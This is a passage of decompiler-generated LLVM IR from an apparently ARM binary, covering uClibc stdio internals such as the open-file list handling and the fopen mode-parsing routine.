  store i32 %v0_1554c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15550

dec_label_pc_15550:                               ; preds = %dec_label_pc_15520, %dec_label_pc_15538.dec_label_pc_1552c_crit_edge, %dec_label_pc_1554c
  %v0_15558 = phi i32 [ %v0_1554c, %dec_label_pc_1554c ], [ %v2_1552c96, %dec_label_pc_15520 ], [ %v2_1552c, %dec_label_pc_15538.dec_label_pc_1552c_crit_edge ]
  %v1_15550 = phi i32 [ %v0_1554c, %dec_label_pc_1554c ], [ %v2_15520, %dec_label_pc_15520 ], [ %v1_15530.pre, %dec_label_pc_15538.dec_label_pc_1552c_crit_edge ]
  %v3_15550 = icmp uge i32 %v0_15558, %v1_15550
  store i1 %v3_15550, i1* %cpsr_c.global-to-local, align 1
  %v9_15550 = icmp eq i32 %v0_15558, %v1_15550
  br i1 %v9_15550, label %dec_label_pc_15558, label %dec_label_pc_15550.dec_label_pc_15520_crit_edge

dec_label_pc_15550.dec_label_pc_15520_crit_edge:  ; preds = %dec_label_pc_15550
  %v0_15520.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15520

dec_label_pc_15558:                               ; preds = %dec_label_pc_15550
  %v2_15558 = icmp ne i32 %v1_15550, 0
  store i1 %v2_15558, i1* %cpsr_c.global-to-local, align 1
  %v7_1555c = icmp slt i32 %v1_15550, 2
  br i1 %v7_1555c, label %dec_label_pc_15578, label %dec_label_pc_15560

dec_label_pc_15560:                               ; preds = %dec_label_pc_15558
  %v0_15560 = load i32, i32* @r7, align 4
  store i32 %v0_15560, i32* %r0.global-to-local, align 4
  %v0_15564 = load i32, i32* %r1.global-to-local, align 4
  %v1_15564 = add i32 %v0_15564, 129
  store i32 %v1_15564, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15578

dec_label_pc_15578:                               ; preds = %dec_label_pc_154f0, %dec_label_pc_15560, %dec_label_pc_15558
  %v0_15578 = load i32, i32* @r5, align 4
  %v1_15578 = inttoptr i32 %v0_15578 to i16*
  %v2_15578 = load i16, i16* %v1_15578, align 2
  %v3_15578 = zext i16 %v2_15578 to i32
  %v1_1557c = and i32 %v3_15578, 24576
  %v1_15580 = or i32 %v1_1557c, 48
  store i32 %v1_15580, i32* %r3.global-to-local, align 4
  %v0_15584 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15584 = icmp eq i32 %v0_15584, 0
  %v1_15588 = trunc i32 %v1_15580 to i16
  store i16 %v1_15588, i16* %v1_15578, align 2
  br i1 %v2_15584, label %dec_label_pc_15590, label %dec_label_pc_15604

dec_label_pc_15590:                               ; preds = %dec_label_pc_15578
  %v0_15590 = load i32, i32* @r5, align 4
  %v1_15590 = add i32 %v0_15590, 60
  %v2_15590 = inttoptr i32 %v1_15590 to i32*
  %v3_15590 = load i32, i32* %v2_15590, align 4
  %v1_15594 = add i32 %v3_15590, -1
  store i32 %v1_15594, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15598 = icmp eq i32 %v1_15594, 0
  store i32 %v1_15594, i32* %v2_15590, align 4
  br i1 %v2_15598, label %dec_label_pc_155a4, label %dec_label_pc_15604

dec_label_pc_155a4:                               ; preds = %dec_label_pc_15590
  %v0_155a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_155a4 = load i32, i32* @r5, align 4
  %v2_155a4 = add i32 %v1_155a4, 64
  %v3_155a4 = inttoptr i32 %v2_155a4 to i32*
  store i32 %v0_155a4, i32* %v3_155a4, align 4
  %v0_155a8 = load i32, i32* @r5, align 4
  %v1_155a8 = add i32 %v0_155a8, 56
  store i32 %v1_155a8, i32* @r6, align 4
  br label %dec_label_pc_155ac

dec_label_pc_155ac:                               ; preds = %dec_label_pc_155dc.dec_label_pc_155ac_crit_edge, %dec_label_pc_155a4
  %v0_155b4 = phi i32 [ %v0_155b4.pre, %dec_label_pc_155dc.dec_label_pc_155ac_crit_edge ], [ %v1_155a8, %dec_label_pc_155a4 ]
  %v0_155ac = phi i32 [ %v0_155ac.pre, %dec_label_pc_155dc.dec_label_pc_155ac_crit_edge ], [ %v0_155a8, %dec_label_pc_155a4 ]
  %v1_155ac = add i32 %v0_155ac, 56
  %v2_155ac = inttoptr i32 %v1_155ac to i32*
  %v3_155ac = load i32, i32* %v2_155ac, align 4
  store i32 %v3_155ac, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_155b4, i32* %r2.global-to-local, align 4
  %v1_155b882 = inttoptr i32 %v0_155b4 to i32*
  %v2_155b883 = load i32, i32* %v1_155b882, align 4
  store i32 %v2_155b883, i32* %r3.global-to-local, align 4
  %v3_155bc85 = icmp uge i32 %v2_155b883, %v3_155ac
  store i1 %v3_155bc85, i1* %cpsr_c.global-to-local, align 1
  %v9_155bc91 = icmp eq i32 %v2_155b883, %v3_155ac
  br i1 %v9_155bc91, label %dec_label_pc_155c4, label %dec_label_pc_155dc

dec_label_pc_155c4:                               ; preds = %dec_label_pc_155ac, %dec_label_pc_155c4.dec_label_pc_155b8_crit_edge
  %v0_155c492 = phi i32 [ %v1_155bc.pre, %dec_label_pc_155c4.dec_label_pc_155b8_crit_edge ], [ %v3_155ac, %dec_label_pc_155ac ]
  store i32 %v0_155c492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_155d4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_155d4, label %dec_label_pc_155d8, label %dec_label_pc_155c4.dec_label_pc_155b8_crit_edge

dec_label_pc_155c4.dec_label_pc_155b8_crit_edge:  ; preds = %dec_label_pc_155c4
  %v0_155b8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_155bc.pre = load i32, i32* @r4, align 4
  %v1_155b8 = inttoptr i32 %v0_155b8.pre to i32*
  %v2_155b8 = load i32, i32* %v1_155b8, align 4
  store i32 %v2_155b8, i32* %r3.global-to-local, align 4
  %v3_155bc = icmp uge i32 %v2_155b8, %v1_155bc.pre
  store i1 %v3_155bc, i1* %cpsr_c.global-to-local, align 1
  %v9_155bc = icmp eq i32 %v2_155b8, %v1_155bc.pre
  br i1 %v9_155bc, label %dec_label_pc_155c4, label %dec_label_pc_155dc

dec_label_pc_155d8:                               ; preds = %dec_label_pc_155c4
  %v0_155d8 = load i32, i32* @r4, align 4
  store i32 %v0_155d8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_155dc

dec_label_pc_155dc:                               ; preds = %dec_label_pc_155ac, %dec_label_pc_155c4.dec_label_pc_155b8_crit_edge, %dec_label_pc_155d8
  %v0_155e4 = phi i32 [ %v0_155d8, %dec_label_pc_155d8 ], [ %v2_155b883, %dec_label_pc_155ac ], [ %v2_155b8, %dec_label_pc_155c4.dec_label_pc_155b8_crit_edge ]
  %v1_155dc = phi i32 [ %v0_155d8, %dec_label_pc_155d8 ], [ %v3_155ac, %dec_label_pc_155ac ], [ %v1_155bc.pre, %dec_label_pc_155c4.dec_label_pc_155b8_crit_edge ]
  %v3_155dc = icmp uge i32 %v0_155e4, %v1_155dc
  store i1 %v3_155dc, i1* %cpsr_c.global-to-local, align 1
  %v9_155dc = icmp eq i32 %v0_155e4, %v1_155dc
  br i1 %v9_155dc, label %dec_label_pc_155e4, label %dec_label_pc_155dc.dec_label_pc_155ac_crit_edge

dec_label_pc_155dc.dec_label_pc_155ac_crit_edge:  ; preds = %dec_label_pc_155dc
  %v0_155ac.pre = load i32, i32* @r5, align 4
  %v0_155b4.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_155ac

dec_label_pc_155e4:                               ; preds = %dec_label_pc_155dc
  %v2_155e4 = icmp ne i32 %v1_155dc, 0
  store i1 %v2_155e4, i1* %cpsr_c.global-to-local, align 1
  %v7_155e8 = icmp slt i32 %v1_155dc, 2
  br i1 %v7_155e8, label %dec_label_pc_15604, label %dec_label_pc_155ec

dec_label_pc_155ec:                               ; preds = %dec_label_pc_155e4
  %v0_155ec = load i32, i32* @r5, align 4
  %v1_155ec = add i32 %v0_155ec, 56
  store i32 %v1_155ec, i32* %r0.global-to-local, align 4
  %v0_155f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_155f0 = add i32 %v0_155f0, 129
  store i32 %v1_155f0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15604

dec_label_pc_15604:                               ; preds = %dec_label_pc_15590, %dec_label_pc_15578, %dec_label_pc_155ec, %dec_label_pc_155e4
  %v0_15604 = load i32, i32* @r5, align 4
  %v1_15604 = inttoptr i32 %v0_15604 to i16*
  %v2_15604 = load i16, i16* %v1_15604, align 2
  %v3_15604 = zext i16 %v2_15604 to i32
  store i32 %v3_15604, i32* %r3.global-to-local, align 4
  %v1_15608 = and i32 %v3_15604, 16384
  %v2_15608 = icmp eq i32 %v1_15608, 0
  br i1 %v2_15608, label %bb49, label %bb48

bb48:                                             ; preds = %dec_label_pc_15604
  %v2_1560c = add i32 %v0_15604, 8
  %v3_1560c = inttoptr i32 %v2_1560c to i32*
  %v4_1560c = load i32, i32* %v3_1560c, align 4
  store i32 %v4_1560c, i32* %r0.global-to-local, align 4
  br label %bb49

bb49:                                             ; preds = %dec_label_pc_15604, %bb48
  %v1_15610 = xor i1 %v2_15608, true
  call void @__pseudo_cond_branch(i1 %v1_15610, i32 ptrtoint (i32* @global_var_12a54.33 to i32))
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15618 = load i32, i32* @r8, align 4
  %v2_15618 = add i32 %v0_15618, 160
  %v3_15618 = inttoptr i32 %v2_15618 to i32*
  %v4_15618 = load i32, i32* %v3_15618, align 4
  store i32 %v4_15618, i32* @r5, align 4
  %v1_1561c = add i32 %v4_15618, 8
  %v2_1561c = inttoptr i32 %v1_1561c to i32*
  %v3_1561c = load i32, i32* %v2_1561c, align 4
  store i32 %v3_1561c, i32* %r3.global-to-local, align 4
  %v1_15620 = load i32, i32* %sl.global-to-local, align 4
  %v3_15620 = icmp uge i32 %v3_1561c, %v1_15620
  store i1 %v3_15620, i1* %cpsr_c.global-to-local, align 1
  %v9_15620 = icmp eq i32 %v3_1561c, %v1_15620
  br i1 %v9_15620, label %dec_label_pc_15668, label %dec_label_pc_15628

dec_label_pc_15628:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_15618, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1563475 = inttoptr i32 %v4_15618 to i32*
  %v2_1563476 = load i32, i32* %v1_1563475, align 4
  store i32 %v2_1563476, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1563878 = icmp eq i32 %v2_1563476, 0
  br i1 %v9_1563878, label %dec_label_pc_15640, label %dec_label_pc_15658

dec_label_pc_15640:                               ; preds = %dec_label_pc_15628, %dec_label_pc_15640.dec_label_pc_15634_crit_edge
  %v0_1564079 = phi i32 [ %v1_15638.pre, %dec_label_pc_15640.dec_label_pc_15634_crit_edge ], [ 0, %dec_label_pc_15628 ]
  store i32 %v0_1564079, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15650 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15650, label %dec_label_pc_15654, label %dec_label_pc_15640.dec_label_pc_15634_crit_edge

dec_label_pc_15640.dec_label_pc_15634_crit_edge:  ; preds = %dec_label_pc_15640
  %v0_15634.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15638.pre = load i32, i32* @r4, align 4
  %v1_15634 = inttoptr i32 %v0_15634.pre to i32*
  %v2_15634 = load i32, i32* %v1_15634, align 4
  store i32 %v2_15634, i32* %r3.global-to-local, align 4
  %v3_15638 = icmp uge i32 %v2_15634, %v1_15638.pre
  store i1 %v3_15638, i1* %cpsr_c.global-to-local, align 1
  %v9_15638 = icmp eq i32 %v2_15634, %v1_15638.pre
  br i1 %v9_15638, label %dec_label_pc_15640, label %dec_label_pc_15658

dec_label_pc_15654:                               ; preds = %dec_label_pc_15640
  %v0_15654 = load i32, i32* @r4, align 4
  store i32 %v0_15654, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15658

dec_label_pc_15658:                               ; preds = %dec_label_pc_15628, %dec_label_pc_15640.dec_label_pc_15634_crit_edge, %dec_label_pc_15654
  %v0_15658 = phi i32 [ %v0_15654, %dec_label_pc_15654 ], [ %v2_1563476, %dec_label_pc_15628 ], [ %v2_15634, %dec_label_pc_15640.dec_label_pc_15634_crit_edge ]
  %v1_15658 = phi i32 [ %v0_15654, %dec_label_pc_15654 ], [ 0, %dec_label_pc_15628 ], [ %v1_15638.pre, %dec_label_pc_15640.dec_label_pc_15634_crit_edge ]
  %v3_15658 = icmp uge i32 %v0_15658, %v1_15658
  store i1 %v3_15658, i1* %cpsr_c.global-to-local, align 1
  %v9_15658 = icmp eq i32 %v0_15658, %v1_15658
  br i1 %v9_15658, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_15658
  %v1_1565c = load i32, i32* @r5, align 4
  store i32 %v1_1565c, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_15658, %bb50
  %v1_15660 = xor i1 %v9_15658, true
  call void @__pseudo_cond_branch(i1 %v1_15660, i32 ptrtoint (i32* @global_var_13c0c.506 to i32))
  %v0_15664 = load i32, i32* %sl.global-to-local, align 4
  %v1_15664 = load i32, i32* @r5, align 4
  %v2_15664 = add i32 %v1_15664, 8
  %v3_15664 = inttoptr i32 %v2_15664 to i32*
  store i32 %v0_15664, i32* %v3_15664, align 4
  %v0_1566c.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_15668

dec_label_pc_15668:                               ; preds = %bb49, %bb51
  %v0_1566c = phi i32 [ %v0_15618, %bb49 ], [ %v0_1566c.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_1566c = add i32 %v0_1566c, 80
  %v3_1566c = inttoptr i32 %v2_1566c to i32*
  %v4_1566c = load i32, i32* %v3_1566c, align 4
  store i32 %v4_1566c, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_15674 = add i32 %v0_1566c, 160
  %v3_15674 = inttoptr i32 %v2_15674 to i32*
  %v4_15674 = load i32, i32* %v3_15674, align 4
  store i32 %v4_15674, i32* %r0.global-to-local, align 4
  %v1_15678 = inttoptr i32 %v4_1566c to i32*
  %v2_15678 = load i32, i32* %v1_15678, align 4
  store i32 %v2_15678, i32* %r3.global-to-local, align 4
  %v1_1567c = add i32 %v4_15674, 4
  %v2_1567c = inttoptr i32 %v1_1567c to i32*
  %v3_1567c = load i32, i32* %v2_1567c, align 4
  store i32 %v3_1567c, i32* %r1.global-to-local, align 4
  %v1_15680 = add i32 %v2_15678, 1
  store i32 %v1_15680, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15684 = icmp eq i32 %v3_1567c, 0
  store i32 %v1_15680, i32* %v1_15678, align 4
  br i1 %v2_15684, label %dec_label_pc_15690, label %dec_label_pc_156f0

dec_label_pc_15690:                               ; preds = %dec_label_pc_15668
  %v0_15690 = load i32, i32* %r1.global-to-local, align 4
  %v1_15690 = load i32, i32* %r0.global-to-local, align 4
  %v2_15690 = add i32 %v1_15690, 8
  %v3_15690 = inttoptr i32 %v2_15690 to i32*
  store i32 %v0_15690, i32* %v3_15690, align 4
  %v0_15694 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15694, i32* @r5, align 4
  br label %dec_label_pc_15698

dec_label_pc_15698:                               ; preds = %dec_label_pc_156c8.dec_label_pc_15698_crit_edge, %dec_label_pc_15690
  %v0_15698 = phi i32 [ %v0_15698.pre, %dec_label_pc_156c8.dec_label_pc_15698_crit_edge ], [ %v0_15694, %dec_label_pc_15690 ]
  %v1_15698 = inttoptr i32 %v0_15698 to i32*
  %v2_15698 = load i32, i32* %v1_15698, align 4
  store i32 %v2_15698, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_15698, i32* %r2.global-to-local, align 4
  %v2_156a464 = load i32, i32* %v1_15698, align 4
  store i32 %v2_156a464, i32* %r3.global-to-local, align 4
  %v3_156a866 = icmp uge i32 %v2_156a464, %v2_15698
  store i1 %v3_156a866, i1* %cpsr_c.global-to-local, align 1
  %v9_156a872 = icmp eq i32 %v2_156a464, %v2_15698
  br i1 %v9_156a872, label %dec_label_pc_156b0, label %dec_label_pc_156c8

dec_label_pc_156b0:                               ; preds = %dec_label_pc_15698, %dec_label_pc_156b0.dec_label_pc_156a4_crit_edge
  %v0_156b073 = phi i32 [ %v1_156a8.pre, %dec_label_pc_156b0.dec_label_pc_156a4_crit_edge ], [ %v2_15698, %dec_label_pc_15698 ]
  store i32 %v0_156b073, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_156c0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_156c0, label %dec_label_pc_156c4, label %dec_label_pc_156b0.dec_label_pc_156a4_crit_edge

dec_label_pc_156b0.dec_label_pc_156a4_crit_edge:  ; preds = %dec_label_pc_156b0
  %v0_156a4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_156a8.pre = load i32, i32* @r4, align 4
  %v1_156a4 = inttoptr i32 %v0_156a4.pre to i32*
  %v2_156a4 = load i32, i32* %v1_156a4, align 4
  store i32 %v2_156a4, i32* %r3.global-to-local, align 4
  %v3_156a8 = icmp uge i32 %v2_156a4, %v1_156a8.pre
  store i1 %v3_156a8, i1* %cpsr_c.global-to-local, align 1
  %v9_156a8 = icmp eq i32 %v2_156a4, %v1_156a8.pre
  br i1 %v9_156a8, label %dec_label_pc_156b0, label %dec_label_pc_156c8

dec_label_pc_156c4:                               ; preds = %dec_label_pc_156b0
  %v0_156c4 = load i32, i32* @r4, align 4
  store i32 %v0_156c4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_156c8

dec_label_pc_156c8:                               ; preds = %dec_label_pc_15698, %dec_label_pc_156b0.dec_label_pc_156a4_crit_edge, %dec_label_pc_156c4
  %v0_156d0 = phi i32 [ %v0_156c4, %dec_label_pc_156c4 ], [ %v2_156a464, %dec_label_pc_15698 ], [ %v2_156a4, %dec_label_pc_156b0.dec_label_pc_156a4_crit_edge ]
  %v1_156c8 = phi i32 [ %v0_156c4, %dec_label_pc_156c4 ], [ %v2_15698, %dec_label_pc_15698 ], [ %v1_156a8.pre, %dec_label_pc_156b0.dec_label_pc_156a4_crit_edge ]
  %v3_156c8 = icmp uge i32 %v0_156d0, %v1_156c8
  store i1 %v3_156c8, i1* %cpsr_c.global-to-local, align 1
  %v9_156c8 = icmp eq i32 %v0_156d0, %v1_156c8
  br i1 %v9_156c8, label %dec_label_pc_156d0, label %dec_label_pc_156c8.dec_label_pc_15698_crit_edge

dec_label_pc_156c8.dec_label_pc_15698_crit_edge:  ; preds = %dec_label_pc_156c8
  %v0_15698.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15698

dec_label_pc_156d0:                               ; preds = %dec_label_pc_156c8
  %v2_156d0 = icmp ne i32 %v1_156c8, 0
  store i1 %v2_156d0, i1* %cpsr_c.global-to-local, align 1
  %v7_156d4 = icmp slt i32 %v1_156c8, 2
  br i1 %v7_156d4, label %dec_label_pc_156f0, label %dec_label_pc_156d8

dec_label_pc_156d8:                               ; preds = %dec_label_pc_156d0
  %v0_156d8 = load i32, i32* @r5, align 4
  store i32 %v0_156d8, i32* %r0.global-to-local, align 4
  %v0_156dc = load i32, i32* %r1.global-to-local, align 4
  %v1_156dc = add i32 %v0_156dc, 129
  store i32 %v1_156dc, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_156f0

dec_label_pc_156f0:                               ; preds = %dec_label_pc_15668, %dec_label_pc_156d8, %dec_label_pc_156d0
  %v0_156f0 = call i32 @_stdio_openlist_dec_use()
  %v0_156f4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_156f4, i32* %r0.global-to-local, align 4
  %v2_156fc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_156fc, i32* @r4, align 4
  store i32 %v6_153e4, i32* @r5, align 4
  store i32 %v9_153e4, i32* @r6, align 4
  store i32 %v12_153e4, i32* @r7, align 4
  ret i32 %v0_156f4

; uselistorder directives
  uselistorder i32 %v0_156c4, { 1, 0, 2 }
  uselistorder i32 %v1_156a8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15698, { 1, 0 }
  uselistorder i32 %v0_1566c, { 1, 0 }
  uselistorder i32 %v0_15654, { 1, 0, 2 }
  uselistorder i32 %v1_15638.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_15620, { 1, 0 }
  uselistorder i32 %v0_155d8, { 1, 0, 2 }
  uselistorder i32 %v1_155bc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1554c, { 1, 0, 2 }
  uselistorder i32 %v1_15530.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_15520, { 1, 0 }
  uselistorder i32 %v0_154dc, { 1, 0, 2 }
  uselistorder i32 %v1_154c0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_154a0, { 1, 0 }
  uselistorder i32 %v1_1542c.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 12, 11, 43, 13, 16, 14, 15, 17, 19, 18, 46, 20, 21, 22, 23, 24, 26, 25, 44, 27, 28, 29, 30, 32, 31, 45, 33, 34, 35, 36, 37, 38, 39, 41, 40, 1, 42 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 26, 27, 3, 4, 5, 34, 35, 6, 7, 8, 9, 24, 25, 10, 11, 12, 13, 14, 28, 29, 15, 16, 17, 30, 31, 18, 19, 20, 21, 32, 33, 22, 23 }
  uselistorder i32 (i32)* @__GI___libc_close, { 29, 28, 6, 5, 32, 4, 31, 30, 3, 2, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 0, 10, 9, 8, 7, 1 }
  uselistorder label %dec_label_pc_156f0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_156c8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_156b0, { 1, 0 }
  uselistorder label %dec_label_pc_15668, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_15658, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15640, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_15604, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_155dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_155c4, { 1, 0 }
  uselistorder label %dec_label_pc_15578, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15550, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15538, { 1, 0 }
  uselistorder label %dec_label_pc_154f0, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_154e0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_154c8, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_15468, { 1, 0 }
  uselistorder label %dec_label_pc_1545c, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_1544c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15434, { 1, 0 }
}

define i32 @function_15708(i32 %arg1) local_unnamed_addr {
dec_label_pc_15708:
  %v0_15708 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_15708, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15708
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15708, %bb
  %v10_15710 = phi i32 [ %arg1, %dec_label_pc_15708 ], [ 0, %bb ]
  ret i32 %v10_15710

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_15724 = call i32 @_stdio_fopen()
  ret i32 %v0_15724
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_15734 = load i32, i32* @r4, align 4
  store i32 %v3_15734, i32* %stack_var_-24, align 4
  %v6_15734 = load i32, i32* @r5, align 4
  %v9_15734 = load i32, i32* @r6, align 4
  %v12_15734 = load i32, i32* @r7, align 4
  %v15_15734 = load i32, i32* @r8, align 4
  %v0_15738 = load i32, i32* @r1, align 4
  %v1_15738 = inttoptr i32 %v0_15738 to i8*
  %v2_15738 = load i8, i8* %v1_15738, align 1
  %v2_15740 = icmp ugt i8 %v2_15738, 113
  store i1 %v2_15740, i1* %cpsr_c.global-to-local, align 1
  %v7_15740 = icmp eq i8 %v2_15738, 114
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* @r8, align 4
  %v0_1574c = load i32, i32* @r0, align 4
  store i32 %v0_1574c, i32* @r7, align 4
  %v0_15750 = load i32, i32* @r2, align 4
  store i32 %v0_15750, i32* @r5, align 4
  %v0_15754 = load i32, i32* @r3, align 4
  store i32 %v0_15754, i32* @r6, align 4
  br i1 %v7_15740, label %dec_label_pc_157a8, label %dec_label_pc_1575c

dec_label_pc_1575c:                               ; preds = %entry
  %v2_1575c = icmp ugt i8 %v2_15738, 118
  store i1 %v2_1575c, i1* %cpsr_c.global-to-local, align 1
  %v7_1575c = icmp eq i8 %v2_15738, 119
  br i1 %v7_1575c, label %bb, label %dec_label_pc_15768

bb:                                               ; preds = %dec_label_pc_1575c
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_157ac

dec_label_pc_15768:                               ; preds = %dec_label_pc_1575c
  %v2_15768 = icmp ugt i8 %v2_15738, 96
  store i1 %v2_15768, i1* %cpsr_c.global-to-local, align 1
  %v7_15768 = icmp eq i8 %v2_15738, 97
  br i1 %v7_15768, label %bb49, label %dec_label_pc_15774

bb49:                                             ; preds = %dec_label_pc_15768
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_157ac

dec_label_pc_15774:                               ; preds = %dec_label_pc_15768, %dec_label_pc_15844, %dec_label_pc_15818
  store i32 49004, i32* %r2.global-to-local, align 4
  %v0_15778 = call i32 @__aeabi_read_tp()
  store i32 %v0_15778, i32* %r0.global-to-local, align 4
  %v3_1577c = load i16, i16* @global_var_216f0.341, align 2
  %v4_1577c = sext i16 %v3_1577c to i32
  store i32 %v4_1577c, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_15784 = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15784 = icmp eq i32 %v0_15784, 0
  %v3_15788 = add i32 %v4_1577c, %v0_15778
  %v4_15788 = inttoptr i32 %v3_15788 to i32*
  store i32 22, i32* %v4_15788, align 4
  br i1 %v2_15784, label %dec_label_pc_15b4c, label %dec_label_pc_15790

dec_label_pc_15790:                               ; preds = %dec_label_pc_15868._crit_edge, %dec_label_pc_15774
  %v0_15790 = load i32, i32* @r5, align 4
  %v1_15790 = inttoptr i32 %v0_15790 to i16*
  %v2_15790 = load i16, i16* %v1_15790, align 2
  %v3_15790 = zext i16 %v2_15790 to i32
  store i32 %v3_15790, i32* %r3.global-to-local, align 4
  %v1_15794 = and i32 %v3_15790, 8192
  %v2_15794 = icmp eq i32 %v1_15794, 0
  br i1 %v2_15794, label %dec_label_pc_15b4c, label %dec_label_pc_1579c

dec_label_pc_1579c:                               ; preds = %dec_label_pc_15790
  store i32 %v0_15790, i32* @r0, align 4
  %v0_157a0 = call i32 @free()
  store i32 %v0_157a0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15b4c

dec_label_pc_157a8:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_157ac

dec_label_pc_157ac:                               ; preds = %bb, %bb49, %dec_label_pc_157a8
  %v1_157c4 = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_157a8 ]
  %v1_157ac = add i32 %v0_15738, 1
  %v2_157ac = inttoptr i32 %v1_157ac to i8*
  %v3_157ac = load i8, i8* %v2_157ac, align 1
  %v2_157b0 = icmp ugt i8 %v3_157ac, 97
  store i1 %v2_157b0, i1* %cpsr_c.global-to-local, align 1
  %v7_157b0 = icmp eq i8 %v3_157ac, 98
  %v1_157ac.v0_15738 = select i1 %v7_157b0, i32 %v1_157ac, i32 %v0_15738
  store i32 %v1_157ac.v0_15738, i32* %r3.global-to-local, align 4
  %v1_157bc = add i32 %v1_157ac.v0_15738, 1
